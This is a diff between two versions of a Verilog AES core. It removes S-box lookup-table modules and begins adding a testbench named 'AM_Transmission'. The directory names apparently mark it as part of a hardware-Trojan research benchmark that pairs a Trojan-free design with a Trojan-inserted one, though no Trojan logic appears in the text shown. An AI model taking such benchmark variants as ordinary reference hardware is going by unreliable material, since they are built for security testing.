- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-module table_lookup (clk, state, p0, p1, p2, p3);
-    input clk;
-    input [31:0] state;
-    output [31:0] p0, p1, p2, p3;
-    wire [7:0] b0, b1, b2, b3;
-    
-    assign {b0, b1, b2, b3} = state;
-    T
-        t0 (clk, b0, {p0[23:0], p0[31:24]}),
-        t1 (clk, b1, {p1[15:0], p1[31:16]}),
-        t2 (clk, b2, {p2[7:0],  p2[31:8]} ),
-        t3 (clk, b3, p3);
-endmodule
-
-/* substitue four bytes in a word */
-module S4 (clk, in, out);
-    input clk;
-    input [31:0] in;
-    output [31:0] out;
-    
-    S
-        S_0 (clk, in[31:24], out[31:24]),
-        S_1 (clk, in[23:16], out[23:16]),
-        S_2 (clk, in[15:8],  out[15:8] ),
-        S_3 (clk, in[7:0],   out[7:0]  );
-endmodule
-
-/* S_box, S_box, S_box*(x+1), S_box*x */
-module T (clk, in, out);
-    input         clk;
-    input  [7:0]  in;
-    output [31:0] out;
-    
-    S
-        s0 (clk, in, out[31:24]);
-    assign out[23:16] = out[31:24];
-    xS
-        s4 (clk, in, out[7:0]);
-    assign out[15:8] = out[23:16] ^ out[7:0];
-endmodule
-
-/* S box */
-module S (clk, in, out);
-    input clk;
-    input [7:0] in;
-    output reg [7:0] out;
-
-    always @ (posedge clk)
-    case (in)
-    8&apos;h00: out &lt;= 8&apos;h63;
-    8&apos;h01: out &lt;= 8&apos;h7c;
-    8&apos;h02: out &lt;= 8&apos;h77;
-    8&apos;h03: out &lt;= 8&apos;h7b;
-    8&apos;h04: out &lt;= 8&apos;hf2;
-    8&apos;h05: out &lt;= 8&apos;h6b;
-    8&apos;h06: out &lt;= 8&apos;h6f;
-    8&apos;h07: out &lt;= 8&apos;hc5;
-    8&apos;h08: out &lt;= 8&apos;h30;
-    8&apos;h09: out &lt;= 8&apos;h01;
-    8&apos;h0a: out &lt;= 8&apos;h67;
-    8&apos;h0b: out &lt;= 8&apos;h2b;
-    8&apos;h0c: out &lt;= 8&apos;hfe;
-    8&apos;h0d: out &lt;= 8&apos;hd7;
-    8&apos;h0e: out &lt;= 8&apos;hab;
-    8&apos;h0f: out &lt;= 8&apos;h76;
-    8&apos;h10: out &lt;= 8&apos;hca;
-    8&apos;h11: out &lt;= 8&apos;h82;
-    8&apos;h12: out &lt;= 8&apos;hc9;
-    8&apos;h13: out &lt;= 8&apos;h7d;
-    8&apos;h14: out &lt;= 8&apos;hfa;
-    8&apos;h15: out &lt;= 8&apos;h59;
-    8&apos;h16: out &lt;= 8&apos;h47;
-    8&apos;h17: out &lt;= 8&apos;hf0;
-    8&apos;h18: out &lt;= 8&apos;had;
-    8&apos;h19: out &lt;= 8&apos;hd4;
-    8&apos;h1a: out &lt;= 8&apos;ha2;
-    8&apos;h1b: out &lt;= 8&apos;haf;
-    8&apos;h1c: out &lt;= 8&apos;h9c;
-    8&apos;h1d: out &lt;= 8&apos;ha4;
-    8&apos;h1e: out &lt;= 8&apos;h72;
-    8&apos;h1f: out &lt;= 8&apos;hc0;
-    8&apos;h20: out &lt;= 8&apos;hb7;
-    8&apos;h21: out &lt;= 8&apos;hfd;
-    8&apos;h22: out &lt;= 8&apos;h93;
-    8&apos;h23: out &lt;= 8&apos;h26;
-    8&apos;h24: out &lt;= 8&apos;h36;
-    8&apos;h25: out &lt;= 8&apos;h3f;
-    8&apos;h26: out &lt;= 8&apos;hf7;
-    8&apos;h27: out &lt;= 8&apos;hcc;
-    8&apos;h28: out &lt;= 8&apos;h34;
-    8&apos;h29: out &lt;= 8&apos;ha5;
-    8&apos;h2a: out &lt;= 8&apos;he5;
-    8&apos;h2b: out &lt;= 8&apos;hf1;
-    8&apos;h2c: out &lt;= 8&apos;h71;
-    8&apos;h2d: out &lt;= 8&apos;hd8;
-    8&apos;h2e: out &lt;= 8&apos;h31;
-    8&apos;h2f: out &lt;= 8&apos;h15;
-    8&apos;h30: out &lt;= 8&apos;h04;
-    8&apos;h31: out &lt;= 8&apos;hc7;
-    8&apos;h32: out &lt;= 8&apos;h23;
-    8&apos;h33: out &lt;= 8&apos;hc3;
-    8&apos;h34: out &lt;= 8&apos;h18;
-    8&apos;h35: out &lt;= 8&apos;h96;
-    8&apos;h36: out &lt;= 8&apos;h05;
-    8&apos;h37: out &lt;= 8&apos;h9a;
-    8&apos;h38: out &lt;= 8&apos;h07;
-    8&apos;h39: out &lt;= 8&apos;h12;
-    8&apos;h3a: out &lt;= 8&apos;h80;
-    8&apos;h3b: out &lt;= 8&apos;he2;
-    8&apos;h3c: out &lt;= 8&apos;heb;
-    8&apos;h3d: out &lt;= 8&apos;h27;
-    8&apos;h3e: out &lt;= 8&apos;hb2;
-    8&apos;h3f: out &lt;= 8&apos;h75;
-    8&apos;h40: out &lt;= 8&apos;h09;
-    8&apos;h41: out &lt;= 8&apos;h83;
-    8&apos;h42: out &lt;= 8&apos;h2c;
-    8&apos;h43: out &lt;= 8&apos;h1a;
-    8&apos;h44: out &lt;= 8&apos;h1b;
-    8&apos;h45: out &lt;= 8&apos;h6e;
-    8&apos;h46: out &lt;= 8&apos;h5a;
-    8&apos;h47: out &lt;= 8&apos;ha0;
-    8&apos;h48: out &lt;= 8&apos;h52;
-    8&apos;h49: out &lt;= 8&apos;h3b;
-    8&apos;h4a: out &lt;= 8&apos;hd6;
-    8&apos;h4b: out &lt;= 8&apos;hb3;
-    8&apos;h4c: out &lt;= 8&apos;h29;
-    8&apos;h4d: out &lt;= 8&apos;he3;
-    8&apos;h4e: out &lt;= 8&apos;h2f;
-    8&apos;h4f: out &lt;= 8&apos;h84;
-    8&apos;h50: out &lt;= 8&apos;h53;
-    8&apos;h51: out &lt;= 8&apos;hd1;
-    8&apos;h52: out &lt;= 8&apos;h00;
-    8&apos;h53: out &lt;= 8&apos;hed;
-    8&apos;h54: out &lt;= 8&apos;h20;
-    8&apos;h55: out &lt;= 8&apos;hfc;
-    8&apos;h56: out &lt;= 8&apos;hb1;
-    8&apos;h57: out &lt;= 8&apos;h5b;
-    8&apos;h58: out &lt;= 8&apos;h6a;
-    8&apos;h59: out &lt;= 8&apos;hcb;
-    8&apos;h5a: out &lt;= 8&apos;hbe;
-    8&apos;h5b: out &lt;= 8&apos;h39;
-    8&apos;h5c: out &lt;= 8&apos;h4a;
-    8&apos;h5d: out &lt;= 8&apos;h4c;
-    8&apos;h5e: out &lt;= 8&apos;h58;
-    8&apos;h5f: out &lt;= 8&apos;hcf;
-    8&apos;h60: out &lt;= 8&apos;hd0;
-    8&apos;h61: out &lt;= 8&apos;hef;
-    8&apos;h62: out &lt;= 8&apos;haa;
-    8&apos;h63: out &lt;= 8&apos;hfb;
-    8&apos;h64: out &lt;= 8&apos;h43;
-    8&apos;h65: out &lt;= 8&apos;h4d;
-    8&apos;h66: out &lt;= 8&apos;h33;
-    8&apos;h67: out &lt;= 8&apos;h85;
-    8&apos;h68: out &lt;= 8&apos;h45;
-    8&apos;h69: out &lt;= 8&apos;hf9;
-    8&apos;h6a: out &lt;= 8&apos;h02;
-    8&apos;h6b: out &lt;= 8&apos;h7f;
-    8&apos;h6c: out &lt;= 8&apos;h50;
-    8&apos;h6d: out &lt;= 8&apos;h3c;
-    8&apos;h6e: out &lt;= 8&apos;h9f;
-    8&apos;h6f: out &lt;= 8&apos;ha8;
-    8&apos;h70: out &lt;= 8&apos;h51;
-    8&apos;h71: out &lt;= 8&apos;ha3;
-    8&apos;h72: out &lt;= 8&apos;h40;
-    8&apos;h73: out &lt;= 8&apos;h8f;
-    8&apos;h74: out &lt;= 8&apos;h92;
-    8&apos;h75: out &lt;= 8&apos;h9d;
-    8&apos;h76: out &lt;= 8&apos;h38;
-    8&apos;h77: out &lt;= 8&apos;hf5;
-    8&apos;h78: out &lt;= 8&apos;hbc;
-    8&apos;h79: out &lt;= 8&apos;hb6;
-    8&apos;h7a: out &lt;= 8&apos;hda;
-    8&apos;h7b: out &lt;= 8&apos;h21;
-    8&apos;h7c: out &lt;= 8&apos;h10;
-    8&apos;h7d: out &lt;= 8&apos;hff;
-    8&apos;h7e: out &lt;= 8&apos;hf3;
-    8&apos;h7f: out &lt;= 8&apos;hd2;
-    8&apos;h80: out &lt;= 8&apos;hcd;
-    8&apos;h81: out &lt;= 8&apos;h0c;
-    8&apos;h82: out &lt;= 8&apos;h13;
-    8&apos;h83: out &lt;= 8&apos;hec;
-    8&apos;h84: out &lt;= 8&apos;h5f;
-    8&apos;h85: out &lt;= 8&apos;h97;
-    8&apos;h86: out &lt;= 8&apos;h44;
-    8&apos;h87: out &lt;= 8&apos;h17;
-    8&apos;h88: out &lt;= 8&apos;hc4;
-    8&apos;h89: out &lt;= 8&apos;ha7;
-    8&apos;h8a: out &lt;= 8&apos;h7e;
-    8&apos;h8b: out &lt;= 8&apos;h3d;
-    8&apos;h8c: out &lt;= 8&apos;h64;
-    8&apos;h8d: out &lt;= 8&apos;h5d;
-    8&apos;h8e: out &lt;= 8&apos;h19;
-    8&apos;h8f: out &lt;= 8&apos;h73;
-    8&apos;h90: out &lt;= 8&apos;h60;
-    8&apos;h91: out &lt;= 8&apos;h81;
-    8&apos;h92: out &lt;= 8&apos;h4f;
-    8&apos;h93: out &lt;= 8&apos;hdc;
-    8&apos;h94: out &lt;= 8&apos;h22;
-    8&apos;h95: out &lt;= 8&apos;h2a;
-    8&apos;h96: out &lt;= 8&apos;h90;
-    8&apos;h97: out &lt;= 8&apos;h88;
-    8&apos;h98: out &lt;= 8&apos;h46;
-    8&apos;h99: out &lt;= 8&apos;hee;
-    8&apos;h9a: out &lt;= 8&apos;hb8;
-    8&apos;h9b: out &lt;= 8&apos;h14;
-    8&apos;h9c: out &lt;= 8&apos;hde;
-    8&apos;h9d: out &lt;= 8&apos;h5e;
-    8&apos;h9e: out &lt;= 8&apos;h0b;
-    8&apos;h9f: out &lt;= 8&apos;hdb;
-    8&apos;ha0: out &lt;= 8&apos;he0;
-    8&apos;ha1: out &lt;= 8&apos;h32;
-    8&apos;ha2: out &lt;= 8&apos;h3a;
-    8&apos;ha3: out &lt;= 8&apos;h0a;
-    8&apos;ha4: out &lt;= 8&apos;h49;
-    8&apos;ha5: out &lt;= 8&apos;h06;
-    8&apos;ha6: out &lt;= 8&apos;h24;
-    8&apos;ha7: out &lt;= 8&apos;h5c;
-    8&apos;ha8: out &lt;= 8&apos;hc2;
-    8&apos;ha9: out &lt;= 8&apos;hd3;
-    8&apos;haa: out &lt;= 8&apos;hac;
-    8&apos;hab: out &lt;= 8&apos;h62;
-    8&apos;hac: out &lt;= 8&apos;h91;
-    8&apos;had: out &lt;= 8&apos;h95;
-    8&apos;hae: out &lt;= 8&apos;he4;
-    8&apos;haf: out &lt;= 8&apos;h79;
-    8&apos;hb0: out &lt;= 8&apos;he7;
-    8&apos;hb1: out &lt;= 8&apos;hc8;
-    8&apos;hb2: out &lt;= 8&apos;h37;
-    8&apos;hb3: out &lt;= 8&apos;h6d;
-    8&apos;hb4: out &lt;= 8&apos;h8d;
-    8&apos;hb5: out &lt;= 8&apos;hd5;
-    8&apos;hb6: out &lt;= 8&apos;h4e;
-    8&apos;hb7: out &lt;= 8&apos;ha9;
-    8&apos;hb8: out &lt;= 8&apos;h6c;
-    8&apos;hb9: out &lt;= 8&apos;h56;
-    8&apos;hba: out &lt;= 8&apos;hf4;
-    8&apos;hbb: out &lt;= 8&apos;hea;
-    8&apos;hbc: out &lt;= 8&apos;h65;
-    8&apos;hbd: out &lt;= 8&apos;h7a;
-    8&apos;hbe: out &lt;= 8&apos;hae;
-    8&apos;hbf: out &lt;= 8&apos;h08;
-    8&apos;hc0: out &lt;= 8&apos;hba;
-    8&apos;hc1: out &lt;= 8&apos;h78;
-    8&apos;hc2: out &lt;= 8&apos;h25;
-    8&apos;hc3: out &lt;= 8&apos;h2e;
-    8&apos;hc4: out &lt;= 8&apos;h1c;
-    8&apos;hc5: out &lt;= 8&apos;ha6;
-    8&apos;hc6: out &lt;= 8&apos;hb4;
-    8&apos;hc7: out &lt;= 8&apos;hc6;
-    8&apos;hc8: out &lt;= 8&apos;he8;
-    8&apos;hc9: out &lt;= 8&apos;hdd;
-    8&apos;hca: out &lt;= 8&apos;h74;
-    8&apos;hcb: out &lt;= 8&apos;h1f;
-    8&apos;hcc: out &lt;= 8&apos;h4b;
-    8&apos;hcd: out &lt;= 8&apos;hbd;
-    8&apos;hce: out &lt;= 8&apos;h8b;
-    8&apos;hcf: out &lt;= 8&apos;h8a;
-    8&apos;hd0: out &lt;= 8&apos;h70;
-    8&apos;hd1: out &lt;= 8&apos;h3e;
-    8&apos;hd2: out &lt;= 8&apos;hb5;
-    8&apos;hd3: out &lt;= 8&apos;h66;
-    8&apos;hd4: out &lt;= 8&apos;h48;
-    8&apos;hd5: out &lt;= 8&apos;h03;
-    8&apos;hd6: out &lt;= 8&apos;hf6;
-    8&apos;hd7: out &lt;= 8&apos;h0e;
-    8&apos;hd8: out &lt;= 8&apos;h61;
-    8&apos;hd9: out &lt;= 8&apos;h35;
-    8&apos;hda: out &lt;= 8&apos;h57;
-    8&apos;hdb: out &lt;= 8&apos;hb9;
-    8&apos;hdc: out &lt;= 8&apos;h86;
-    8&apos;hdd: out &lt;= 8&apos;hc1;
-    8&apos;hde: out &lt;= 8&apos;h1d;
-    8&apos;hdf: out &lt;= 8&apos;h9e;
-    8&apos;he0: out &lt;= 8&apos;he1;
-    8&apos;he1: out &lt;= 8&apos;hf8;
-    8&apos;he2: out &lt;= 8&apos;h98;
-    8&apos;he3: out &lt;= 8&apos;h11;
-    8&apos;he4: out &lt;= 8&apos;h69;
-    8&apos;he5: out &lt;= 8&apos;hd9;
-    8&apos;he6: out &lt;= 8&apos;h8e;
-    8&apos;he7: out &lt;= 8&apos;h94;
-    8&apos;he8: out &lt;= 8&apos;h9b;
-    8&apos;he9: out &lt;= 8&apos;h1e;
-    8&apos;hea: out &lt;= 8&apos;h87;
-    8&apos;heb: out &lt;= 8&apos;he9;
-    8&apos;hec: out &lt;= 8&apos;hce;
-    8&apos;hed: out &lt;= 8&apos;h55;
-    8&apos;hee: out &lt;= 8&apos;h28;
-    8&apos;hef: out &lt;= 8&apos;hdf;
-    8&apos;hf0: out &lt;= 8&apos;h8c;
-    8&apos;hf1: out &lt;= 8&apos;ha1;
-    8&apos;hf2: out &lt;= 8&apos;h89;
-    8&apos;hf3: out &lt;= 8&apos;h0d;
-    8&apos;hf4: out &lt;= 8&apos;hbf;
-    8&apos;hf5: out &lt;= 8&apos;he6;
-    8&apos;hf6: out &lt;= 8&apos;h42;
-    8&apos;hf7: out &lt;= 8&apos;h68;
-    8&apos;hf8: out &lt;= 8&apos;h41;
-    8&apos;hf9: out &lt;= 8&apos;h99;
-    8&apos;hfa: out &lt;= 8&apos;h2d;
-    8&apos;hfb: out &lt;= 8&apos;h0f;
-    8&apos;hfc: out &lt;= 8&apos;hb0;
-    8&apos;hfd: out &lt;= 8&apos;h54;
-    8&apos;hfe: out &lt;= 8&apos;hbb;
-    8&apos;hff: out &lt;= 8&apos;h16;
-    endcase
-endmodule
-
-/* S box * x */
-module xS (clk, in, out);
-    input clk;
-    input [7:0] in;
-    output reg [7:0] out;
-
-    always @ (posedge clk)
-    case (in)
-    8&apos;h00: out &lt;= 8&apos;hc6;
-    8&apos;h01: out &lt;= 8&apos;hf8;
-    8&apos;h02: out &lt;= 8&apos;hee;
-    8&apos;h03: out &lt;= 8&apos;hf6;
-    8&apos;h04: out &lt;= 8&apos;hff;
-    8&apos;h05: out &lt;= 8&apos;hd6;
-    8&apos;h06: out &lt;= 8&apos;hde;
-    8&apos;h07: out &lt;= 8&apos;h91;
-    8&apos;h08: out &lt;= 8&apos;h60;
-    8&apos;h09: out &lt;= 8&apos;h02;
-    8&apos;h0a: out &lt;= 8&apos;hce;
-    8&apos;h0b: out &lt;= 8&apos;h56;
-    8&apos;h0c: out &lt;= 8&apos;he7;
-    8&apos;h0d: out &lt;= 8&apos;hb5;
-    8&apos;h0e: out &lt;= 8&apos;h4d;
-    8&apos;h0f: out &lt;= 8&apos;hec;
-    8&apos;h10: out &lt;= 8&apos;h8f;
-    8&apos;h11: out &lt;= 8&apos;h1f;
-    8&apos;h12: out &lt;= 8&apos;h89;
-    8&apos;h13: out &lt;= 8&apos;hfa;
-    8&apos;h14: out &lt;= 8&apos;hef;
-    8&apos;h15: out &lt;= 8&apos;hb2;
-    8&apos;h16: out &lt;= 8&apos;h8e;
-    8&apos;h17: out &lt;= 8&apos;hfb;
-    8&apos;h18: out &lt;= 8&apos;h41;
-    8&apos;h19: out &lt;= 8&apos;hb3;
-    8&apos;h1a: out &lt;= 8&apos;h5f;
-    8&apos;h1b: out &lt;= 8&apos;h45;
-    8&apos;h1c: out &lt;= 8&apos;h23;
-    8&apos;h1d: out &lt;= 8&apos;h53;
-    8&apos;h1e: out &lt;= 8&apos;he4;
-    8&apos;h1f: out &lt;= 8&apos;h9b;
-    8&apos;h20: out &lt;= 8&apos;h75;
-    8&apos;h21: out &lt;= 8&apos;he1;
-    8&apos;h22: out &lt;= 8&apos;h3d;
-    8&apos;h23: out &lt;= 8&apos;h4c;
-    8&apos;h24: out &lt;= 8&apos;h6c;
-    8&apos;h25: out &lt;= 8&apos;h7e;
-    8&apos;h26: out &lt;= 8&apos;hf5;
-    8&apos;h27: out &lt;= 8&apos;h83;
-    8&apos;h28: out &lt;= 8&apos;h68;
-    8&apos;h29: out &lt;= 8&apos;h51;
-    8&apos;h2a: out &lt;= 8&apos;hd1;
-    8&apos;h2b: out &lt;= 8&apos;hf9;
-    8&apos;h2c: out &lt;= 8&apos;he2;
-    8&apos;h2d: out &lt;= 8&apos;hab;
-    8&apos;h2e: out &lt;= 8&apos;h62;
-    8&apos;h2f: out &lt;= 8&apos;h2a;
-    8&apos;h30: out &lt;= 8&apos;h08;
-    8&apos;h31: out &lt;= 8&apos;h95;
-    8&apos;h32: out &lt;= 8&apos;h46;
-    8&apos;h33: out &lt;= 8&apos;h9d;
-    8&apos;h34: out &lt;= 8&apos;h30;
-    8&apos;h35: out &lt;= 8&apos;h37;
-    8&apos;h36: out &lt;= 8&apos;h0a;
-    8&apos;h37: out &lt;= 8&apos;h2f;
-    8&apos;h38: out &lt;= 8&apos;h0e;
-    8&apos;h39: out &lt;= 8&apos;h24;
-    8&apos;h3a: out &lt;= 8&apos;h1b;
-    8&apos;h3b: out &lt;= 8&apos;hdf;
-    8&apos;h3c: out &lt;= 8&apos;hcd;
-    8&apos;h3d: out &lt;= 8&apos;h4e;
-    8&apos;h3e: out &lt;= 8&apos;h7f;
-    8&apos;h3f: out &lt;= 8&apos;hea;
-    8&apos;h40: out &lt;= 8&apos;h12;
-    8&apos;h41: out &lt;= 8&apos;h1d;
-    8&apos;h42: out &lt;= 8&apos;h58;
-    8&apos;h43: out &lt;= 8&apos;h34;
-    8&apos;h44: out &lt;= 8&apos;h36;
-    8&apos;h45: out &lt;= 8&apos;hdc;
-    8&apos;h46: out &lt;= 8&apos;hb4;
-    8&apos;h47: out &lt;= 8&apos;h5b;
-    8&apos;h48: out &lt;= 8&apos;ha4;
-    8&apos;h49: out &lt;= 8&apos;h76;
-    8&apos;h4a: out &lt;= 8&apos;hb7;
-    8&apos;h4b: out &lt;= 8&apos;h7d;
-    8&apos;h4c: out &lt;= 8&apos;h52;
-    8&apos;h4d: out &lt;= 8&apos;hdd;
-    8&apos;h4e: out &lt;= 8&apos;h5e;
-    8&apos;h4f: out &lt;= 8&apos;h13;
-    8&apos;h50: out &lt;= 8&apos;ha6;
-    8&apos;h51: out &lt;= 8&apos;hb9;
-    8&apos;h52: out &lt;= 8&apos;h00;
-    8&apos;h53: out &lt;= 8&apos;hc1;
-    8&apos;h54: out &lt;= 8&apos;h40;
-    8&apos;h55: out &lt;= 8&apos;he3;
-    8&apos;h56: out &lt;= 8&apos;h79;
-    8&apos;h57: out &lt;= 8&apos;hb6;
-    8&apos;h58: out &lt;= 8&apos;hd4;
-    8&apos;h59: out &lt;= 8&apos;h8d;
-    8&apos;h5a: out &lt;= 8&apos;h67;
-    8&apos;h5b: out &lt;= 8&apos;h72;
-    8&apos;h5c: out &lt;= 8&apos;h94;
-    8&apos;h5d: out &lt;= 8&apos;h98;
-    8&apos;h5e: out &lt;= 8&apos;hb0;
-    8&apos;h5f: out &lt;= 8&apos;h85;
-    8&apos;h60: out &lt;= 8&apos;hbb;
-    8&apos;h61: out &lt;= 8&apos;hc5;
-    8&apos;h62: out &lt;= 8&apos;h4f;
-    8&apos;h63: out &lt;= 8&apos;hed;
-    8&apos;h64: out &lt;= 8&apos;h86;
-    8&apos;h65: out &lt;= 8&apos;h9a;
-    8&apos;h66: out &lt;= 8&apos;h66;
-    8&apos;h67: out &lt;= 8&apos;h11;
-    8&apos;h68: out &lt;= 8&apos;h8a;
-    8&apos;h69: out &lt;= 8&apos;he9;
-    8&apos;h6a: out &lt;= 8&apos;h04;
-    8&apos;h6b: out &lt;= 8&apos;hfe;
-    8&apos;h6c: out &lt;= 8&apos;ha0;
-    8&apos;h6d: out &lt;= 8&apos;h78;
-    8&apos;h6e: out &lt;= 8&apos;h25;
-    8&apos;h6f: out &lt;= 8&apos;h4b;
-    8&apos;h70: out &lt;= 8&apos;ha2;
-    8&apos;h71: out &lt;= 8&apos;h5d;
-    8&apos;h72: out &lt;= 8&apos;h80;
-    8&apos;h73: out &lt;= 8&apos;h05;
-    8&apos;h74: out &lt;= 8&apos;h3f;
-    8&apos;h75: out &lt;= 8&apos;h21;
-    8&apos;h76: out &lt;= 8&apos;h70;
-    8&apos;h77: out &lt;= 8&apos;hf1;
-    8&apos;h78: out &lt;= 8&apos;h63;
-    8&apos;h79: out &lt;= 8&apos;h77;
-    8&apos;h7a: out &lt;= 8&apos;haf;
-    8&apos;h7b: out &lt;= 8&apos;h42;
-    8&apos;h7c: out &lt;= 8&apos;h20;
-    8&apos;h7d: out &lt;= 8&apos;he5;
-    8&apos;h7e: out &lt;= 8&apos;hfd;
-    8&apos;h7f: out &lt;= 8&apos;hbf;
-    8&apos;h80: out &lt;= 8&apos;h81;
-    8&apos;h81: out &lt;= 8&apos;h18;
-    8&apos;h82: out &lt;= 8&apos;h26;
-    8&apos;h83: out &lt;= 8&apos;hc3;
-    8&apos;h84: out &lt;= 8&apos;hbe;
-    8&apos;h85: out &lt;= 8&apos;h35;
-    8&apos;h86: out &lt;= 8&apos;h88;
-    8&apos;h87: out &lt;= 8&apos;h2e;
-    8&apos;h88: out &lt;= 8&apos;h93;
-    8&apos;h89: out &lt;= 8&apos;h55;
-    8&apos;h8a: out &lt;= 8&apos;hfc;
-    8&apos;h8b: out &lt;= 8&apos;h7a;
-    8&apos;h8c: out &lt;= 8&apos;hc8;
-    8&apos;h8d: out &lt;= 8&apos;hba;
-    8&apos;h8e: out &lt;= 8&apos;h32;
-    8&apos;h8f: out &lt;= 8&apos;he6;
-    8&apos;h90: out &lt;= 8&apos;hc0;
-    8&apos;h91: out &lt;= 8&apos;h19;
-    8&apos;h92: out &lt;= 8&apos;h9e;
-    8&apos;h93: out &lt;= 8&apos;ha3;
-    8&apos;h94: out &lt;= 8&apos;h44;
-    8&apos;h95: out &lt;= 8&apos;h54;
-    8&apos;h96: out &lt;= 8&apos;h3b;
-    8&apos;h97: out &lt;= 8&apos;h0b;
-    8&apos;h98: out &lt;= 8&apos;h8c;
-    8&apos;h99: out &lt;= 8&apos;hc7;
-    8&apos;h9a: out &lt;= 8&apos;h6b;
-    8&apos;h9b: out &lt;= 8&apos;h28;
-    8&apos;h9c: out &lt;= 8&apos;ha7;
-    8&apos;h9d: out &lt;= 8&apos;hbc;
-    8&apos;h9e: out &lt;= 8&apos;h16;
-    8&apos;h9f: out &lt;= 8&apos;had;
-    8&apos;ha0: out &lt;= 8&apos;hdb;
-    8&apos;ha1: out &lt;= 8&apos;h64;
-    8&apos;ha2: out &lt;= 8&apos;h74;
-    8&apos;ha3: out &lt;= 8&apos;h14;
-    8&apos;ha4: out &lt;= 8&apos;h92;
-    8&apos;ha5: out &lt;= 8&apos;h0c;
-    8&apos;ha6: out &lt;= 8&apos;h48;
-    8&apos;ha7: out &lt;= 8&apos;hb8;
-    8&apos;ha8: out &lt;= 8&apos;h9f;
-    8&apos;ha9: out &lt;= 8&apos;hbd;
-    8&apos;haa: out &lt;= 8&apos;h43;
-    8&apos;hab: out &lt;= 8&apos;hc4;
-    8&apos;hac: out &lt;= 8&apos;h39;
-    8&apos;had: out &lt;= 8&apos;h31;
-    8&apos;hae: out &lt;= 8&apos;hd3;
-    8&apos;haf: out &lt;= 8&apos;hf2;
-    8&apos;hb0: out &lt;= 8&apos;hd5;
-    8&apos;hb1: out &lt;= 8&apos;h8b;
-    8&apos;hb2: out &lt;= 8&apos;h6e;
-    8&apos;hb3: out &lt;= 8&apos;hda;
-    8&apos;hb4: out &lt;= 8&apos;h01;
-    8&apos;hb5: out &lt;= 8&apos;hb1;
-    8&apos;hb6: out &lt;= 8&apos;h9c;
-    8&apos;hb7: out &lt;= 8&apos;h49;
-    8&apos;hb8: out &lt;= 8&apos;hd8;
-    8&apos;hb9: out &lt;= 8&apos;hac;
-    8&apos;hba: out &lt;= 8&apos;hf3;
-    8&apos;hbb: out &lt;= 8&apos;hcf;
-    8&apos;hbc: out &lt;= 8&apos;hca;
-    8&apos;hbd: out &lt;= 8&apos;hf4;
-    8&apos;hbe: out &lt;= 8&apos;h47;
-    8&apos;hbf: out &lt;= 8&apos;h10;
-    8&apos;hc0: out &lt;= 8&apos;h6f;
-    8&apos;hc1: out &lt;= 8&apos;hf0;
-    8&apos;hc2: out &lt;= 8&apos;h4a;
-    8&apos;hc3: out &lt;= 8&apos;h5c;
-    8&apos;hc4: out &lt;= 8&apos;h38;
-    8&apos;hc5: out &lt;= 8&apos;h57;
-    8&apos;hc6: out &lt;= 8&apos;h73;
-    8&apos;hc7: out &lt;= 8&apos;h97;
-    8&apos;hc8: out &lt;= 8&apos;hcb;
-    8&apos;hc9: out &lt;= 8&apos;ha1;
-    8&apos;hca: out &lt;= 8&apos;he8;
-    8&apos;hcb: out &lt;= 8&apos;h3e;
-    8&apos;hcc: out &lt;= 8&apos;h96;
-    8&apos;hcd: out &lt;= 8&apos;h61;
-    8&apos;hce: out &lt;= 8&apos;h0d;
-    8&apos;hcf: out &lt;= 8&apos;h0f;
-    8&apos;hd0: out &lt;= 8&apos;he0;
-    8&apos;hd1: out &lt;= 8&apos;h7c;
-    8&apos;hd2: out &lt;= 8&apos;h71;
-    8&apos;hd3: out &lt;= 8&apos;hcc;
-    8&apos;hd4: out &lt;= 8&apos;h90;
-    8&apos;hd5: out &lt;= 8&apos;h06;
-    8&apos;hd6: out &lt;= 8&apos;hf7;
-    8&apos;hd7: out &lt;= 8&apos;h1c;
-    8&apos;hd8: out &lt;= 8&apos;hc2;
-    8&apos;hd9: out &lt;= 8&apos;h6a;
-    8&apos;hda: out &lt;= 8&apos;hae;
-    8&apos;hdb: out &lt;= 8&apos;h69;
-    8&apos;hdc: out &lt;= 8&apos;h17;
-    8&apos;hdd: out &lt;= 8&apos;h99;
-    8&apos;hde: out &lt;= 8&apos;h3a;
-    8&apos;hdf: out &lt;= 8&apos;h27;
-    8&apos;he0: out &lt;= 8&apos;hd9;
-    8&apos;he1: out &lt;= 8&apos;heb;
-    8&apos;he2: out &lt;= 8&apos;h2b;
-    8&apos;he3: out &lt;= 8&apos;h22;
-    8&apos;he4: out &lt;= 8&apos;hd2;
-    8&apos;he5: out &lt;= 8&apos;ha9;
-    8&apos;he6: out &lt;= 8&apos;h07;
-    8&apos;he7: out &lt;= 8&apos;h33;
-    8&apos;he8: out &lt;= 8&apos;h2d;
-    8&apos;he9: out &lt;= 8&apos;h3c;
-    8&apos;hea: out &lt;= 8&apos;h15;
-    8&apos;heb: out &lt;= 8&apos;hc9;
-    8&apos;hec: out &lt;= 8&apos;h87;
-    8&apos;hed: out &lt;= 8&apos;haa;
-    8&apos;hee: out &lt;= 8&apos;h50;
-    8&apos;hef: out &lt;= 8&apos;ha5;
-    8&apos;hf0: out &lt;= 8&apos;h03;
-    8&apos;hf1: out &lt;= 8&apos;h59;
-    8&apos;hf2: out &lt;= 8&apos;h09;
-    8&apos;hf3: out &lt;= 8&apos;h1a;
-    8&apos;hf4: out &lt;= 8&apos;h65;
-    8&apos;hf5: out &lt;= 8&apos;hd7;
-    8&apos;hf6: out &lt;= 8&apos;h84;
-    8&apos;hf7: out &lt;= 8&apos;hd0;
-    8&apos;hf8: out &lt;= 8&apos;h82;
-    8&apos;hf9: out &lt;= 8&apos;h29;
-    8&apos;hfa: out &lt;= 8&apos;h5a;
-    8&apos;hfb: out &lt;= 8&apos;h1e;
-    8&apos;hfc: out &lt;= 8&apos;h7b;
-    8&apos;hfd: out &lt;= 8&apos;ha8;
-    8&apos;hfe: out &lt;= 8&apos;h6d;
-    8&apos;hff: out &lt;= 8&apos;h2c;
-    endcase
-endmodule
diff -rupN aes/src/tjfree/tb_tsc.v aes/src/tjin-t600/tb_tsc.v
--- aes/src/tjfree/tb_tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t600/tb_tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,62 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
